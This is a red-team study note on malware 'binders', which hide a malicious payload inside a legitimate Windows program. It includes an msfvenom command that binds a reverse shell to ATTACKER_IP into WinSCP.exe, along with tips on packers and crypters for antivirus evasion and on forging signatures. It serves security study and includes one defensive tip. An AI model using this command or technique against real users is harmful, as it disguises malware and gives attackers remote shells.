---
{"dg-publish":true,"permalink":"/cards/red-team/binders-malware-development/","tags":["red-team"]}
---

~ [[cards/red-team/Evading Antivirus - Shellcode\|Evading Antivirus - Shellcode]]
### Introduction
---
It applies the concept of trojan malware but still different: it is a tool used to combine a legitimate program (game or utility) with a malicious payload - resulting when the file is run, the legitimate app will launch normally, but the malicious code executes in the background:

![Evading Antivirus - Shellcode-7.png|450](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode-7.png)

While every single binder might work slightly differently, they will basically add the code of your shellcode inside the legitimate program and have it executed somehow.

Change the entry point in the PE header so that our shell code executes right before the program, in this way, when the user clicks the resulting executable, your shellcode will get silently executed first and continue running the program normally without the user noticing it.

#### Key Topics
---
- [[#Binding with Msfvenom|Inject malicious payloads into legitimate programs using msfvenom’s -x option and create disguised reverse shells.]]
    
- [[#Questions and Problems|Understand execution prerequisites, limitations, and security concerns around binder use, including architecture compatibility and digital signatures.]]

## Binding with Msfvenom
---
The method used by msfvenom injects your malicious program by creating an extra thread for it, slightly different from what was mentioned previously however achieves the same result, this is much better since the legitimate program won't get blocked in case your shellcode fails for some reason.

```C
msfvenom -x Path/to/binary/WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
```

In this case we are executing WinSCP but in the background it will execute our payload:

![Evading Antivirus - Shellcode-8.png|550](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode-8.png)

In our attacker shell:

![Evading Antivirus - Shellcode-9.png](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode-9.png)

It wont' help hiding our payload against AV solutions - the main use is to fool the users believing they are executing a legitimate executable rather than a malicious payload.

When creating a real payload, you may want to use encoders, crypters, or packers to hide your shellcode from signature-based AVs and then bind it into a known executable so that the user doesn't know what is being executed.
### Questions and Problems
---
**Prerequisites or condition in order for binders to work?**

1. **Matching Architecture** Both binder and payload must be the same bitness—x86 or x64—else the injection will fail.
2. **Digital Signatures**
	- **Description**: Binding invalidates code signing unless re-signed, which is rare for malicious use.
	- **Red Team Tip**: If forging a signature, it must be trusted in the target environment.
	- **Blue Team Tip**: Treat unsigned or signature-altered binaries, especially those mimicking trusted software, as highly suspicious.
